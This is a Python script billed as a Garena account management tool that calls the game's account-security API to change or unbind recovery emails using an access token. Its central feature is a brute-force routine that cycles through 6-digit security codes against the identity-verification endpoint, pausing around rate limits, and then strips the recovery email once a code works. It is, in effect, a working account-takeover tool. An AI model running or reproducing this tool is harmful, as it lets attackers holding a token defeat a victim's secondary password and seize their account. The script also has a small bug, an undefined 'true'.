import requests
import json
import time
import hashlib
import itertools
import threading
from typing import Optional, Dict, Any, Set
from datetime import datetime, timedelta

class GarenaAPI:
    def __init__(self):
        self.headers = {
            'User-Agent': "GarenaMSDK/4.0.19P10(ASUS_Z01QD ;Android 9;en;US;)",
            'Connection': "Keep-Alive",
            'Accept': "*/*",
            'X-Requested-With': "com.garena.game.kgid",
            'Content-Type': "application/x-www-form-urlencoded"
        }
        
        self.urls = {
            "bind_info": "https://100067.connect.garena.com/game/account_security/bind:get_bind_info",
            "send_otp": "https://100067.connect.garena.com/game/account_security/bind:send_otp",
            "verify_otp": "https://100067.connect.garena.com/game/account_security/bind:verify_otp",
            "create_bind": "https://100067.connect.garena.com/game/account_security/bind:create_bind_request",
            "cancel_request": "https://100067.connect.garena.com/game/account_security/bind:cancel_request",
            "verify_identity": "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:verify_identity",
            "unbind_identity": "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:unbind_identity",
            "get_platforms": "https://100067.connect.garena.com/bind/app/platform/info/get"
        }
        
        self.platforms_map = {
            3: "Facebook",
            8: "Gmail",
            10: "iCloud",
            5: "VK",
            11: "Twitter",
            7: "Huawei"
        }
    
    def security_to_secondary(self, security_code: str) -> str:
        """
        Convert security code to secondary password using SHA256
        This matches the JavaScript function:
        function _sha256_upper(text) {
            return crypto.createHash('sha256').update(text).digest('hex').toUpperCase();
        }
        """
        if not security_code:
            return None
        # Create SHA256 hash and convert to uppercase
        return hashlib.sha256(security_code.encode('utf-8')).hexdigest().upper()
    
    def get_bind_info(self, access_token: str) -> Dict[str, Any]:
        """
        Get current bind information for the account
        """
        try:
            url = self.urls["bind_info"]
            params = {
                "app_id": "100067",
                "access_token": access_token
            }
            
            print(f"\n📊 Fetching bind info from: {url}")
            
            response = requests.get(url, headers=self.headers, params=params)
            data = response.json()
            
            print("📋 Bind Info Response:")
            print(json.dumps(data, indent=2))
            
            def convert_seconds(s: int) -> str:
                """Convert seconds to days/hours/minutes format"""
                if s <= 0:
                    return "0"
                d = s // 86400
                h = (s % 86400) // 3600
                m = (s % 3600) // 60
                sec = s % 60
                return f"{d} Day {h} Hour {m} Min {sec} Sec"
            
            # Extract information
            email = data.get('email', '')
            email_to_be = data.get('email_to_be', '')
            countdown = data.get('request_exec_countdown', 0)
            
            # Create summary
            if email == "" and email_to_be != "":
                summary = f"⏳ Pending email confirmation: {email_to_be} - Confirms in: {convert_seconds(countdown)}"
            elif email != "" and email_to_be == "":
                summary = f"✅ Email confirmed: {email}"
            elif email == "" and email_to_be == "":
                summary = "ℹ️ No recovery email set"
            else:
                summary = f"Current: {email} | Pending: {email_to_be}"
            
            return {
                "status": "success",
                "data": {
                    "current_email": email,
                    "pending_email": email_to_be,
                    "countdown_seconds": countdown,
                    "countdown_human": convert_seconds(countdown) if countdown > 0 else "0",
                    "has_pending": bool(email_to_be),
                    "raw_response": data
                },
                "summary": summary
            }
            
        except requests.exceptions.RequestException as e:
            return {
                "status": "error",
                "message": f"Network error: {str(e)}"
            }
        except Exception as e:
            return {
                "status": "error",
                "message": f"Error: {str(e)}"
            }
    
    def get_platforms(self, access_token: str) -> Dict[str, Any]:
        """
        Get bounded platforms information
        """
        try:
            url = self.urls["get_platforms"]
            params = {
                "access_token": access_token
            }
            
            print(f"\n📱 Fetching platforms info from: {url}")
            
            response = requests.get(url, headers=self.headers, params=params)
            data = response.json()
            
            print("📋 Platforms Response:")
            print(json.dumps(data, indent=2))
            
            bounded_accounts = data.get('bounded_accounts', [])
            
            # Format bounded accounts with platform names
            formatted_accounts = []
            for account in bounded_accounts:
                platform_id = account.get('platform')
                platform_name = self.platforms_map.get(platform_id, f"Unknown Platform ({platform_id})")
                formatted_accounts.append({
                    "platform_id": platform_id,
                    "platform_name": platform_name,
                    "account_info": account.get('account_info', ''),
                    "bind_time": account.get('bind_time', 0)
                })
            
            return {
                "status": "success",
                "data": {
                    "bounded_accounts": formatted_accounts,
                    "available_platforms": data.get('available_platforms', []),
                    "raw_response": data
                },
                "summary": f"Found {len(formatted_accounts)} bounded accounts"
            }
            
        except Exception as e:
            return {
                "status": "error",
                "message": f"Error: {str(e)}"
            }
    
    def verify_identity(self, access_token: str, security_code: str) -> Dict[str, Any]:
        """
        Verify identity using security code (converts to SHA256 first)
        """
        try:
            # Convert security code to SHA256 secondary password
            secondary_password = self.security_to_secondary(security_code)
            
            url = self.urls["verify_identity"]
            data = {
                "app_id": "100067",
                "access_token": access_token,
                "secondary_password": secondary_password
            }
            
            response = requests.post(url, headers=self.headers, data=data)
            result = response.json()
            
            if result.get('result') == 0:
                return {
                    "status": "success",
                    "message": "✅ Identity verified successfully",
                    "identity_token": result.get('identity_token'),
                    "data": result
                }
            else:
                error_messages = {
                    1: "Invalid security code",
                    2: "Security code expired",
                    3: "Too many attempts",
                    4: "Invalid access token",
                    100001: "Rate limited",
                    100002: "Account locked"
                }
                error_msg = error_messages.get(result.get('result'), "Verification failed")
                
                # Check if rate limited
                is_rate_limited = result.get('result') in [100001, 3]
                
                return {
                    "status": "error",
                    "message": f"❌ {error_msg}",
                    "is_rate_limited": is_rate_limited,
                    "data": result
                }
                
        except Exception as e:
            return {
                "status": "error",
                "message": f"Network error: {str(e)}",
                "is_rate_limited": False
            }
    
    def unbind_identity(self, access_token: str, identity_token: str) -> Dict[str, Any]:
        """
        Unbind identity using identity token
        """
        try:
            url = self.urls["unbind_identity"]
            data = {
                "app_id": "100067",
                "access_token": access_token,
                "identity_token": identity_token
            }
            
            print(f"\n🔓 Unbinding identity: {url}")
            
            response = requests.post(url, headers=self.headers, data=data)
            result = response.json()
            
            print("📋 Unbind Identity Response:")
            print(json.dumps(result, indent=2))
            
            if result.get('result') == 0:
                return {
                    "status": "success",
                    "message": "✅ Recovery unbind successful",
                    "data": result
                }
            else:
                error_messages = {
                    1: "Invalid identity token",
                    2: "Token expired",
                    3: "No bound identity found",
                    4: "Cannot unbind at this time"
                }
                error_msg = error_messages.get(result.get('result'), "Unbind failed")
                
                return {
                    "status": "error",
                    "message": f"❌ {error_msg}",
                    "data": result
                }
                
        except Exception as e:
            return {
                "status": "error",
                "message": f"Network error: {str(e)}"
            }
    
    def cancel_request(self, access_token: str) -> Dict[str, Any]:
        """
        Cancel pending email change request
        """
        try:
            url = self.urls["cancel_request"]
            data = {
                "app_id": "100067",
                "access_token": access_token
            }
            
            print(f"\n🗑️ Cancelling pending request: {url}")
            
            response = requests.post(url, headers=self.headers, data=data)
            result = response.json()
            
            print("📋 Cancel Request Response:")
            print(json.dumps(result, indent=2))
            
            if result.get('result') == 0:
                return {
                    "status": "success",
                    "message": "✅ Pending email change request cancelled successfully",
                    "data": result
                }
            else:
                error_messages = {
                    1: "No pending request found",
                    2: "Request already executed",
                    3: "Invalid access token",
                    4: "Cannot cancel at this time"
                }
                error_msg = error_messages.get(result.get('result'), "Failed to cancel request")
                
                return {
                    "status": "error",
                    "message": f"❌ {error_msg}",
                    "data": result
                }
                
        except Exception as e:
            return {
                "status": "error",
                "message": f"Network error: {str(e)}"
            }
    
    def send_otp(self, access_token: str, email: str, security_code: Optional[str] = None) -> Dict[str, Any]:
        """
        Step 1: Send OTP to the email address
        If security_code is provided, it will be converted to SHA256 secondary_password
        """
        try:
            url = self.urls["send_otp"]
            data = {
                "app_id": "100067",
                "access_token": access_token,
                "locale": "en_IN"
            }
            
            if email:
                data["email"] = email
            
            # Convert security code to SHA256 secondary_password if provided
            if security_code:
                secondary_password = self.security_to_secondary(security_code)
                print(f"\n🔐 Converting your security code to SHA256")
                data["security_code"] = secondary_password
            
            print(f"\n📤 Sending OTP request to: {url}")
            print(f"   Email: {email}")
            
            response = requests.post(url, headers=self.headers, data=data)
            result = response.json()
            
            print("📨 OTP Send Response:")
            print(json.dumps(result, indent=2))
            
            if result.get('result') == 0:
                return {
                    "status": "success",
                    "message": "OTP sent successfully to your email",
                    "data": result
                }
            else:
                error_messages = {
                    1: "Invalid access token",
                    2: "Invalid email",
                    3: "Rate limited",
                    4: "Security code required",
                    5: "Invalid security code",
                    100001: "Too many requests"
                }
                error_msg = error_messages.get(result.get('result'), "Failed to send OTP")
                
                return {
                    "status": "error",
                    "message": error_msg,
                    "data": result
                }
                
        except Exception as e:
            return {
                "status": "error",
                "message": f"Network error: {str(e)}"
            }
    
    def change_email(self, access_token: str, new_email: str, verification_code: str, security_code: Optional[str] = None) -> Dict[str, Any]:
        """
        Step 2 & 3: Verify OTP and create bind request
        If security_code is provided, it will be converted to SHA256 secondary_password
        """
        try:
            # Step 2: Verify the OTP
            verify_url = self.urls["verify_otp"]
            verify_data = {
                "app_id": "100067",
                "access_token": access_token,
                "otp": verification_code,
                "email": new_email
            }
            
            print(f"\n🔐 Verifying OTP: {verify_url}")
            
            verify_response = requests.post(verify_url, headers=self.headers, data=verify_data)
            verify_result = verify_response.json()
            
            print("✅ Verify OTP Response:")
            print(json.dumps(verify_result, indent=2))
            
            if verify_result.get('result') != 0:
                error_messages = {
                    1: "Invalid OTP code",
                    2: "OTP expired",
                    3: "Too many attempts",
                    4: "Invalid session"
                }
                error_msg = error_messages.get(verify_result.get('result'), "OTP verification failed")
                
                return {
                    "status": "error",
                    "message": error_msg,
                    "data": verify_result
                }
            
            # Step 3: Create the bind request
            bind_url = self.urls["create_bind"]
            bind_data = {
                "app_id": "100067",
                "access_token": access_token,
                "verifier_token": verify_result.get('verifier_token'),
                "email": new_email
            }
            
            # Convert security code to SHA256 secondary_password if provided
            if security_code:
                secondary_password = self.security_to_secondary(security_code)
                print(f"\n🔐 Converting your security code to SHA256 for bind request")
                bind_data["secondary_password"] = secondary_password
            
            print(f"\n📝 Creating bind request: {bind_url}")
            
            bind_response = requests.post(bind_url, headers=self.headers, data=bind_data)
            bind_result = bind_response.json()
            
            print("📋 Create Bind Response:")
            print(json.dumps(bind_result, indent=2))
            
            if bind_result.get('result') == 0:
                return {
                    "status": "success",
                    "message": "✅ Email change request created successfully! Check your new email for confirmation.",
                    "data": bind_result
                }
            else:
                error_messages = {
                    1: "Invalid verifier token",
                    2: "Email already in use",
                    3: "Security code required - You need to set a security code for your account",
                    4: "Invalid security code - The security code you entered is incorrect",
                    5: "Account locked",
                    6: "Rate limited"
                }
                error_msg = error_messages.get(bind_result.get('result'), "Failed to change email")
                
                return {
                    "status": "error",
                    "message": f"❌ {error_msg}",
                    "data": bind_result
                }
                
        except Exception as e:
            return {
                "status": "error",
                "message": f"Network error: {str(e)}"
            }


class BruteForceState:
    def __init__(self):
        self.is_running = False
        self.access_token = ""
        self.attempts = 0
        self.current_code = ""
        self.found = False
        self.found_code = ""
        self.last_error = ""
        self.is_rate_limited = False
        self.next_attempt_time = 0
        self.codes_tried: Set[str] = set()
        self.start_time = 0
        self.pause_time = 0

def generate_6digit_codes():
    """Generate all possible 6-digit codes from 000000 to 999999"""
    for i in range(1000000):
        yield f"{i:06d}"

def run_brute_force(state: BruteForceState, api: GarenaAPI):
    """
    Run brute force attack to find the security code
    """
    if not state.is_running or state.found:
        return

    # Check if we're rate limited and need to wait
    current_time = time.time()
    if current_time < state.next_attempt_time:
        wait_time = int(state.next_attempt_time - current_time)
        print(f"\n⏳ Rate limited. Waiting {wait_time} seconds...")
        time.sleep(1)
        # Schedule next attempt
        if state.is_running:
            threading.Timer(1.0, run_brute_force, args=(state, api)).start()
        return

    # Generate next code to try
    # First try common codes
    common_codes = [
        "123456", "111111", "000000", "123123", "654321", 
        "999999", "888888", "777777", "121212", "112233",
        "123321", "123123", "111222", "222222", "333333",
        "444444", "555555", "666666", "777777", "888888",
        "999999", "000000", "123456", "654321", "987654"
    ]
    
    code = None
    
    # Try common codes first
    for c in common_codes:
        if c not in state.codes_tried:
            code = c
            break
    
    # If no common codes left, generate random 6-digit codes
    if not code and not state.found:
        # Generate a random 6-digit code not tried yet
        import random
        attempts = 0
        while attempts < 100:  # Limit attempts to avoid infinite loop
            random_code = f"{random.randint(0, 999999):06d}"
            if random_code not in state.codes_tried:
                code = random_code
                break
            attempts += 1
    
    if not code:
        print("\n❌ No more codes to try!")
        state.is_running = False
        return

    # Update state
    state.current_code = code
    state.codes_tried.add(code)
    state.attempts += 1

    # Calculate rate (attempts per minute)
    elapsed = time.time() - state.start_time
    rate = state.attempts / (elapsed / 60) if elapsed > 0 else 0

    # Print status
    print(f"\n{'='*60}")
    print(f"🔍 Attempt #{state.attempts} | Code: {code}")
    print(f"⏱️  Rate: {rate:.1f} attempts/minute")
    print(f"📊 Codes tried: {len(state.codes_tried)}/1,000,000 ({len(state.codes_tried)/10000:.2f}%)")
    print(f"{'='*60}")

    try:
        # Try to verify identity with this code
        result = api.verify_identity(state.access_token, code)
        
        state.last_error = f"Code {code}: {result['message']}"
        
        if result.get('status') == 'success':
            state.found = True
            state.found_code = code
            state.is_running = False
            print(f"\n✅🎉 SUCCESS! Found security code: {code}")
            print(f"🔑 Identity Token: {result.get('identity_token')}")
            return
            
        elif result.get('is_rate_limited'):
            state.is_rate_limited = true
            # Wait 60 seconds when rate limited
            state.next_attempt_time = time.time() + 60
            print(f"\n⚠️ Rate limited! Pausing for 60 seconds...")
        else:
            state.is_rate_limited = False
            
    except Exception as e:
        state.last_error = f"Error: {str(e)}"
        print(f"\n❌ Error: {str(e)}")

    # Continue brute force if still running
    if state.is_running and not state.found:
        # Add delay between attempts (2 seconds)
        delay = 2
        if state.is_rate_limited:
            delay = 60
        threading.Timer(delay, run_brute_force, args=(state, api)).start()

def print_banner():
    print("=" * 60)
    print("     GARENA ACCOUNT MANAGEMENT TOOL")
    print("=" * 60)
    print("1. Check Bind Info")
    print("2. Change Email")
    print("3. Cancel Pending Request")
    print("4. Unbind Identity (Recovery Email)")
    print("5. 🔓 BRUTE FORCE - Find Security Code")
    print("=" * 60)

def check_bind_info_menu(api: GarenaAPI):
    """Menu for checking bind information"""
    print("\n🔍 CHECK BIND INFORMATION")
    print("-" * 40)
    
    access_token = input("Access Token: ").strip()
    if not access_token:
        print("❌ Error: Access Token is required!")
        return
    
    result = api.get_bind_info(access_token)
    
    print("\n" + "=" * 60)
    print("📊 BIND INFORMATION RESULT:")
    print("=" * 60)
    
    if result['status'] == 'success':
        print(f"\n{result['summary']}")
        print("\n📋 Detailed Information:")
        print(f"   📧 Current Email: {result['data']['current_email'] or 'None'}")
        print(f"   ⏳ Pending Email: {result['data']['pending_email'] or 'None'}")
        print(f"   ⏱️  Countdown: {result['data']['countdown_human']}")
        
        if result['data']['has_pending']:
            print("\n💡 Tip: Use option 3 to cancel this pending request if needed")
    else:
        print(f"\n❌ Error: {result['message']}")
    
    if 'data' in result and result['data'].get('raw_response'):
        print("\n📦 Raw Response:")
        print(json.dumps(result['data']['raw_response'], indent=2))

def get_platforms_menu(api: GarenaAPI):
    """Menu for getting platforms info (helper for unbind)"""
    print("\n📱 CHECK BOUND PLATFORMS")
    print("-" * 40)
    
    access_token = input("Access Token: ").strip()
    if not access_token:
        print("❌ Error: Access Token is required!")
        return None
    
    result = api.get_platforms(access_token)
    
    print("\n" + "=" * 60)
    print("📱 PLATFORMS RESULT:")
    print("=" * 60)
    
    if result['status'] == 'success':
        accounts = result['data']['bounded_accounts']
        if accounts:
            print(f"\n✅ {result['summary']}")
            print("\n📋 Bounded Accounts:")
            for i, account in enumerate(accounts, 1):
                print(f"   {i}. {account['platform_name']} - {account['account_info']}")
        else:
            print("\nℹ️ No bounded accounts found")
    else:
        print(f"\n❌ Error: {result['message']}")
    
    return access_token

def brute_force_menu(api: GarenaAPI):
    """Menu for brute forcing security code"""
    print("\n Find Security Code")
    print("=" * 60)
    print("⚠️  WARNING: This will try many different 6-digit codes")
    print("   to find your account's security code.")
    print("   - The API may rate limit you")
    print("   - This could take a long time (up to millions of attempts)")
    print("   - Use responsibly")
    print("=" * 60)
    
    access_token = input("\n🔑 Access Token: ").strip()
    if not access_token:
        print("❌ Error: Access Token is required!")
        return
    
    # Check bind info first
    print("\n🔍 Checking current bind info...")
    bind_result = api.get_bind_info(access_token)
    if bind_result['status'] == 'success':
        print(f"\n{bind_result['summary']}")
    
    # Confirm start
    print("\n⚠️  This will start brute forcing all possible 6-digit codes (1,000,000 combinations)")
    print("   Common codes will be tried first, then random codes.")
    
    confirm = input("\nStart brute force? (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("❌ Brute force cancelled")
        return
    
    # Initialize brute force state
    state = BruteForceState()
    state.is_running = True
    state.access_token = access_token
    state.start_time = time.time()
    
    # Add common codes to tried set at the beginning
    common_codes = [
        "123456", "111111", "000000", "123123", "654321", 
        "999999", "888888", "777777", "121212", "112233",
        "123321", "123123", "111222", "222222", "333333",
        "444444", "555555", "666666", "777777", "888888",
        "999999", "000000", "123456", "654321", "987654"
    ]
    
    print("\n" + "=" * 60)
    print("⚙️ BRUTE FORCE STARTED")
    print("=" * 60)
    print("🔄 Trying common codes first...")
    
    # Start brute force in a separate thread
    thread = threading.Thread(target=run_brute_force, args=(state, api))
    thread.daemon = True
    thread.start()
    
    # Monitor loop
    try:
        while state.is_running and not state.found:
            time.sleep(5)
            # Print status update every 5 seconds
            elapsed = time.time() - state.start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            
            print(f"\n📊 Status Update:")
            print(f"   ⏱️  Time elapsed: {hours}h {minutes}m {seconds}s")
            print(f"   🔢 Attempts: {state.attempts}")
            print(f"   🔑 Current code: {state.current_code}")
            print(f"   📋 Last error: {state.last_error[:50]}...")
            
            if state.is_rate_limited:
                wait_remaining = max(0, int(state.next_attempt_time - time.time()))
                print(f"   ⏳ Rate limited - resuming in {wait_remaining}s")
            
            # Check if user wants to stop
            print("\n   Press 's' and Enter to stop, or Enter to continue...")
            import sys
            import select
            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                user_input = sys.stdin.readline().strip()
                if user_input.lower() == 's':
                    state.is_running = False
                    print("\n🛑 Stopping brute force...")
                    break
        
        if state.found:
            print("\n" + "=" * 60)
            print("🎉🎉🎉 SUCCESS! 🎉🎉🎉")
            print("=" * 60)
            print(f"✅ Found Security Code: {state.found_code}")
            print(f"🔑 Attempts: {state.attempts}")
            print(f"⏱️  Time taken: {hours}h {minutes}m {seconds}s")
            
            # Ask if user wants to unbind now
            unbind_now = input("\nUnbind identity now with this code? (yes/no): ").strip().lower()
            if unbind_now == 'yes':
                # Verify identity first
                verify_result = api.verify_identity(access_token, state.found_code)
                if verify_result['status'] == 'success':
                    identity_token = verify_result.get('identity_token')
                    if identity_token:
                        print("\n⚙️ Unbinding identity...")
                        unbind_result = api.unbind_identity(access_token, identity_token)
                        print(f"\n📋 Result: {unbind_result['message']}")
                else:
                    print(f"\n❌ Verification failed: {verify_result['message']}")
        else:
            print("\n🛑 Brute force stopped.")
            
    except KeyboardInterrupt:
        state.is_running = False
        print("\n\n🛑 Brute force interrupted by user.")

def unbind_identity_menu(api: GarenaAPI):
    """Menu for unbinding identity (recovery email)"""
    print("\n🔓 UNBIND IDENTITY (RECOVERY EMAIL)")
    print("-" * 40)
    print("⚠️  WARNING: This will remove the recovery email from your account!")
    print("   You will need your account's security code to verify your identity.")
    print("   The security code is the one YOU SET for your account (like a password).")
    print("-" * 40)
    
    # Get access token
    access_token = input("\n🔑 Access Token: ").strip()
    if not access_token:
        print("❌ Error: Access Token is required!")
        return
    
    # Option to check current bind info
    check_first = input("\n🔍 Check current bind info first? (yes/no): ").strip().lower()
    if check_first == 'yes':
        bind_result = api.get_bind_info(access_token)
        if bind_result['status'] == 'success':
            print(f"\n{bind_result['summary']}")
    
    # Ask if they want to brute force
    print("\n🔓 Do you know your security code?")
    print("1. I know my security code")
    print("2. I want to BRUTE FORCE find my security code")
    
    choice = input("\nSelect option (1-2): ").strip()
    
    if choice == '2':
        brute_force_menu(api)
        return
    elif choice != '1':
        print("❌ Invalid option")
        return
    
    # Get security code
    print("\n🔐 Step 1: Identity Verification")
    print("Enter your account's SECURITY CODE (the code you set for your account):")
    security_code = input("Security Code: ").strip()
    
    if not security_code:
        print("❌ Error: Security Code is required!")
        return
    
    # Verify identity
    print("\n" + "=" * 60)
    print("⚙️ VERIFYING IDENTITY...")
    print("=" * 60)
    
    verify_result = api.verify_identity(access_token, security_code)
    
    print(f"\n📋 Verification Result: {verify_result['message']}")
    
    if verify_result['status'] == 'error':
        print("\n❌ Cannot proceed without identity verification.")
        return
    
    identity_token = verify_result.get('identity_token')
    if not identity_token:
        print("\n❌ No identity token received!")
        return
    
    print(f"\n✅ Identity verified! Token received.")
    
    # Confirm unbind
    print("\n⚠️  FINAL WARNING: This will remove the recovery email from your account!")
    print("   This action cannot be undone without setting a new recovery email.")
    
    confirm = input("\nAre you absolutely sure you want to unbind? (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("❌ Unbind cancelled")
        return
    
    # Perform unbind
    print("\n" + "=" * 60)
    print("⚙️ PROCESSING UNBIND...")
    print("=" * 60)
    
    unbind_result = api.unbind_identity(access_token, identity_token)
    
    print("\n" + "=" * 60)
    print("📋 UNBIND RESULT:")
    print("=" * 60)
    print(f"Status: {unbind_result['status'].upper()}")
    print(f"Message: {unbind_result['message']}")
    
    if unbind_result['status'] == 'success':
        print("\n✅ Recovery email has been successfully unbound!")
        print("   Your account no longer has a recovery email.")
        
        # Show updated bind info
        print("\n🔍 Fetching updated bind info...")
        time.sleep(1)
        bind_result = api.get_bind_info(access_token)
        if bind_result['status'] == 'success':
            print(f"\n📊 Updated: {bind_result['summary']}")
    
    if 'data' in unbind_result and unbind_result['data']:
        print("\n📦 Raw Response:")
        print(json.dumps(unbind_result['data'], indent=2))

def cancel_request_menu(api: GarenaAPI):
    """Menu for canceling pending email change request"""
    print("\n🗑️ CANCEL PENDING REQUEST")
    print("-" * 40)
    
    access_token = input("Access Token: ").strip()
    if not access_token:
        print("❌ Error: Access Token is required!")
        return
    
    # First check if there's a pending request
    print("\n🔍 Checking current bind info...")
    bind_result = api.get_bind_info(access_token)
    
    if bind_result['status'] == 'success':
        if not bind_result['data']['has_pending']:
            print("\nℹ️ No pending request found to cancel.")
            confirm = input("Still try to cancel? (yes/no): ").strip().lower()
            if confirm != 'yes':
                return
        else:
            print(f"\n📋 Found pending request for: {bind_result['data']['pending_email']}")
            print(f"⏱️  Time remaining: {bind_result['data']['countdown_human']}")
    
    # Confirm cancellation
    print("\n⚠️  WARNING: This will cancel any pending email change request!")
    confirm = input("Are you sure you want to proceed? (yes/no): ").strip().lower()
    
    if confirm != 'yes':
        print("❌ Cancellation aborted")
        return
    
    # Cancel the request
    print("\n" + "=" * 60)
    print("⚙️ PROCESSING CANCELLATION...")
    print("=" * 60)
    
    result = api.cancel_request(access_token)
    
    print("\n" + "=" * 60)
    print("📋 CANCELLATION RESULT:")
    print("=" * 60)
    print(f"Status: {result['status'].upper()}")
    print(f"Message: {result['message']}")
    
    if 'data' in result and result['data']:
        print("\n📦 Raw Response:")
        print(json.dumps(result['data'], indent=2))

def change_email_menu(api: GarenaAPI):
    """Menu for changing email"""
    print("\n📧 CHANGE EMAIL")
    print("-" * 40)
    print("📝 IMPORTANT: The 'Security Code' is the code YOU SET for your account.")
    print("   It's like a secondary password. If you don't have one, leave it blank.")
    print("   If provided, it will be converted to SHA256 automatically.")
    print("-" * 40)
    
    # Get access token first
    print("\n🔑 Step 1: Authentication")
    access_token = input("Access Token: ").strip()
    if not access_token:
        print("❌ Error: Access Token is required!")
        return
    
    # Option to check current bind info first
    check_first = input("\n🔍 Check current bind info first? (yes/no): ").strip().lower()
    if check_first == 'yes':
        bind_result = api.get_bind_info(access_token)
        if bind_result['status'] == 'success':
            print(f"\n{bind_result['summary']}")
            if bind_result['data']['has_pending']:
                print("\n⚠️  There's already a pending request!")
                cancel_first = input("Cancel it first? (yes/no): ").strip().lower()
                if cancel_first == 'yes':
                    cancel_result = api.cancel_request(access_token)
                    print(f"Cancel result: {cancel_result['message']}")
        else:
            print(f"\n⚠️ Could not fetch bind info: {bind_result['message']}")
    
    # Get email
    print("\n📧 Step 2: Enter New Email")
    new_email = input("New Email Address: ").strip()
    if not new_email:
        print("❌ Error: Email is required!")
        return
    if "@" not in new_email or "." not in new_email:
        print("❌ Error: Invalid email format!")
        return
    
    # Optional security code (the one YOU set for your account)
    print("\n🔒 Step 3: Security Code (Optional)")
    print("This is the security code YOU SET for your account (like a password).")
    print("If you don't have one, just press Enter to skip.")
    security_code = input("Your Security Code: ").strip()
    if not security_code:
        security_code = None
        print("   ℹ️ No security code provided - continuing without it")
    else:
        print("   ℹ️ Security code will be converted to SHA256")
    
    # Send OTP
    print("\n📨 Step 4: Sending OTP")
    print(f"Sending OTP to: {new_email}")
    
    otp_result = api.send_otp(access_token, new_email, security_code)
    
    if otp_result['status'] == 'error':
        print(f"\n❌ Failed to send OTP: {otp_result['message']}")
        if 'data' in otp_result:
            print(f"   Response: {json.dumps(otp_result['data'], indent=2)}")
        return
    
    print(f"\n✅ {otp_result['message']}")
    
    # Get verification code
    print("\n🔢 Step 5: Enter Verification Code")
    print("Please check your email for the OTP code")
    verification_code = input("Verification Code (OTP from email): ").strip()
    
    if not verification_code:
        print("❌ Error: Verification Code is required!")
        return
    
    # Confirm before proceeding
    print("\n" + "=" * 60)
    print("📋 SUMMARY:")
    print("=" * 60)
    print(f"📧 New Email: {new_email}")
    print(f"🔑 OTP Code: {verification_code}")
    if security_code:
        print(f"🔒 Security Code: {'[PROVIDED - will be hashed]'}")
    else:
        print(f"🔒 Security Code: Not provided")
    print("=" * 60)
    
    confirm = input("\nProceed with email change? (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("❌ Operation cancelled")
        return
    
    # Change email
    print("\n" + "=" * 60)
    print("⚙️ PROCESSING EMAIL CHANGE...")
    print("=" * 60)
    
    result = api.change_email(access_token, new_email, verification_code, security_code)
    
    print("\n" + "=" * 60)
    print("📋 FINAL RESULT:")
    print("=" * 60)
    print(f"Status: {result['status'].upper()}")
    print(f"Message: {result['message']}")
    
    if 'data' in result and result['data']:
        print("\n📦 Raw Response:")
        print(json.dumps(result['data'], indent=2))

def main():
    while True:
        print_banner()
        
        choice = input("\nSelect option (1-5) or 'q' to quit: ").strip()
        
        if choice == 'q':
            print("\n👋 Goodbye!")
            break
        elif choice == '1':
            api = GarenaAPI()
            check_bind_info_menu(api)
        elif choice == '2':
            api = GarenaAPI()
            change_email_menu(api)
        elif choice == '3':
            api = GarenaAPI()
            cancel_request_menu(api)
        elif choice == '4':
            api = GarenaAPI()
            unbind_identity_menu(api)
        elif choice == '5':
            api = GarenaAPI()
            brute_force_menu(api)
        else:
            print("\n❌ Invalid option! Please select 1-5 or q")
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n❌ Process interrupted by user.")
    except Exception as e:
        print(f"\n❌ Fatal error: {str(e)}")